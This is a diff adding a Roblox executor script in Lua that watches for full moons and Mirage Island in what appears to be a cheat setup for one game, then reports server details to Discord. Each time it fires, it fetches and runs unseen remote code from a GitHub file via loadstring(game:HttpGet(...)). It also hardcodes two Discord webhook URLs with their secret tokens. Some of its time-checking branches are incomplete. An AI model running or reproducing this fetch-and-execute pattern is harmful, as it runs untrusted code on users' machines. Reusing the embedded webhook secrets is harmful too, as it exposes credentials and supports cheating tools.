@@ -1,0 +1,252 @@
+
+local Players = game:GetService("Players")
+    local playerCount = #game:GetService("Players"):GetPlayers()
+local FullMoon = ""
+
+spawn(function()
+    while task.wait() do
+        pcall(function()
+             if game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149431" then
+                        FullMoon = "🌑 : Full Moon 100%"
+                    elseif game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149052" then
+                        FullMoon ="🌒 : Full Moon 75%"
+                    elseif game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709143733" then
+                        FullMoon="🌓 : Full Moon 50%"
+                    elseif game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709150401" then
+                        FullMoon="🌗 : Full Moon 25%"
+                    elseif game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149680" then
+                        FullMoon="🌖 : Full Moon 15%"
+                    else
+                        FullMoon="🌚 : Full Moon 0%"
+                    end
+                end)
+            end
+end)
+
+
+
+
+spawn(function()
+    while true do
+        task.wait()
+
+        pcall(function()
+            local currentTime = game.Lighting.TimeOfDay
+             if currentTime >= "09:00:00" and currentTime <= "09:59:00" then
+                Checktime1 = "9AM"
+                elseif currentTime >= "10:00:00" and currentTime <= "10:59:00" then
+                Checktime1 = "10AM"
+                 elseif currentTime >= "11:00:00" and currentTime <= "11:59:00" then
+                Checktime1 = "11AM"
+                 elseif currentTime >= "12:00:00" and currentTime <= "12:59:00" then
+                Checktime1 = "12PM"
+            elseif currentTime >= "13:00:00" and currentTime <= "13:59:00" then
+                Checktime1 = "1PM"
+            elseif currentTime >= "14:00:00" and currentTime <= "14:59:00" then
+                Checktime1 = "2PM"
+                elseif currentTime >= "15:00:00" and currentTime <= "15:59:00" then
+                Checktime1 = "3PM"
+                 elseif currentTime >= "16:00:00" and currentTime <= "16:59:00" then
+                Checktime1 = "4PM"
+            elseif currentTime >= "17:00:00" and currentTime <= "17:59:00" then
+                Checktime1 = "5PM"
+            elseif currentTime >= "18:00:00" and currentTime <= "18:59:00" then
+                Checktime1 = "6PM"
+            elseif currentTime >= "19:00:00" and currentTime <= "19:59:00" then
+                Checktime1 = "7PM"
+            elseif currentTime >= "20:00:00" and currentTime <= "20:59:00" then
+                Checktime1 = "8PM"
+            elseif currentTime >= "21:00:00" and currentTime <= "21:59:00" then
+                Checktime1 = "9PM"
+            elseif currentTime >= "22:00:00" and currentTime <= "22:59:00" then
+                Checktime1 = "10PM"
+            elseif currentTime >= "23:00:00" and currentTime <= "23:30:00" then
+                Checktime1 = "11PM"
+            elseif currentTime >= "00:00:00" and currentTime <= "00:59:00" then
+                Checktime1 = "12AM"
+            elseif currentTime >= "01:00:00" and currentTime <= "01:59:00" then
+                Checktime1 = "1AM"
+            elseif currentTime >= "02:00:00" and currentTime <= "02:59:00" then
+                Checktime1 = "2AM"
+            elseif currentTime >= "03:00:00" and currentTime <= "03:59:00" then
+                Checktime1 = "3AM"
+            elseif currentTime >= "04:00:00" and currentTime <= "04:59:00" then
+                Checktime1 = "4AM"
+            elseif currentTime >= "05:00:00" and currentTime <= "05:59:00" then
+            end
+        end)
+    end
+end)
+
+
+
+spawn(function()
+    while true do
+        task.wait() -- Đợi 1 giây trước khi kiểm tra lại
+
+        pcall(function()
+            local currentTime = game.Lighting.TimeOfDay
+            if currentTime >= "13:00:00" and currentTime <= "13:59:00" then
+                Checktime = "1PM"
+            elseif currentTime >= "14:00:00" and currentTime <= "14:59:00" then
+                Checktime = "2PM"
+                elseif currentTime >= "15:00:00" and currentTime <= "15:59:00" then
+                Checktime = "3PM"
+                 elseif currentTime >= "16:00:00" and currentTime <= "16:59:00" then
+                Checktime = "4PM"
+            elseif currentTime >= "17:00:00" and currentTime <= "17:59:00" then
+                Checktime = "5PM"
+            elseif currentTime >= "18:00:00" and currentTime <= "18:59:00" then
+                Checktime = "6PM"
+            elseif currentTime >= "19:00:00" and currentTime <= "19:59:00" then
+                Checktime = "7PM"
+            elseif currentTime >= "20:00:00" and currentTime <= "20:59:00" then
+                Checktime = "8PM"
+            elseif currentTime >= "21:00:00" and currentTime <= "21:59:00" then
+                Checktime = "9PM"
+            elseif currentTime >= "22:00:00" and currentTime <= "22:59:00" then
+                Checktime = "10PM"
+            elseif currentTime >= "23:00:00" and currentTime <= "23:30:00" then
+                Checktime = "11PM"
+            elseif currentTime >= "00:00:00" and currentTime <= "00:59:00" then
+                Checktime = "12AM"
+            elseif currentTime >= "01:00:00" and currentTime <= "01:59:00" then
+                Checktime = "1AM"
+            elseif currentTime >= "02:00:00" and currentTime <= "02:59:00" then
+                Checktime = "2AM"
+            elseif currentTime >= "03:00:00" and currentTime <= "03:59:00" then
+                Checktime = "3AM"
+            elseif currentTime >= "04:00:00" and currentTime <= "04:59:00" then
+                Checktime = "4AM"
+            elseif currentTime >= "05:00:00" and currentTime <= "05:59:00" then
+                Checktime = "End Full Moon"
+            else
+                Checktime = "End Full Moon"
+            end
+        end)
+    end
+end)
+
+
+
+spawn(function()
+    while task.wait() do
+        pcall(function()
+             if game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149431" then
+                        FullMoon123 = "Full Moon"
+                        else
+                        FullMoon123 = "End Full Moon"
+                    end
+                end)
+            end
+end)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/sadsadsafdfasf/b/main/wedhook'))()
+
+                    local HttpService = game:GetService("HttpService")
+                    local Data =
+                        {
+                            ["embeds"]= {
+                                {            
+                                    ["title"]= "Mirage Island";
+                                    ["color"]= tonumber(0x7269da);
+                                    
+                                    ["fields"]= {
+                                        
+                                     
+                                    
+                                        {
+                                            ["name"]= "Player In Server",
+                                            ["value"]= "```"..playerCount.."/12```",
+                                            ["inline"]= true
+                                        },
+                                        {
+                                            ["name"]= "Time",
+                                            ["value"]= "```"..Checktime1.."```",
+                                            ["inline"]= true
+                                        },
+                                    {
+                                            ["name"]= "Teleport Script",
+                                            ["value"]= 'game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)',
+                                            ["inline"]= true
+                                        },
+                                    }              
+                                }
+                            }
+                    }
+                    local Headers = {["Content-Type"]="application/json"}
+                    local Encoded = HttpService:JSONEncode(Data)
+                    
+                    Request = http_request or request or HttpPost or syn.request
+                    local Final1 = {Url = "https://discord.com/api/webhooks/1163488326301519912/eGafX8JLz9sAjCqiiTMzUhCypCYCFSl73ZjyPED_q9a_T171iQFLUNCOmSg4pKAbK_ix" , Body = Encoded, Method = "POST", Headers = Headers}
+                   
+                    Request(Final1)
+                    end
+
+
+
+if game.PlaceId == 7449423635 then 
+if game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149431" then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/sadsadsafdfasf/b/main/wedhook'))()
+
+                    local HttpService = game:GetService("HttpService")
+local Data =
+{
+    ["embeds"] = {
+        {
+            ["title"] = "Full Moon",
+            ["color"] = tonumber(0x7269da),
+            ["fields"] = {
+                {
+                    ["name"] = "Time",
+                    ["value"] = "```"..Checktime.. "```",
+                    ["inline"] = true
+                },
+             {
+                    ["name"] = "Check Moon",
+                    ["value"] = "```"..FullMoon123.. "```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Player In Server",
+                    ["value"] = "```" .. playerCount .. "/12```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Teleport Script",
+                    ["value"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '", game.Players.LocalPlayer)',
+                    ["inline"] = true
+                },
+            }
+        }
+    }
+}
+local Headers = { ["Content-Type"] = "application/json" }
+local Encoded = HttpService:JSONEncode(Data)
+
+Request = http_request or request or HttpPost or syn.request
+local Final1 = { Url = "https://discord.com/api/webhooks/1163484879271514152/WppT-yNFY4C9do8FEmapo3UJCjcR8p77A0zS_ZCa6cNfmBFm0117OfnpVjWdNIn9yb9o", Body = Encoded, Method = "POST", Headers = Headers }
+
+Request(Final1)
+end
+                end
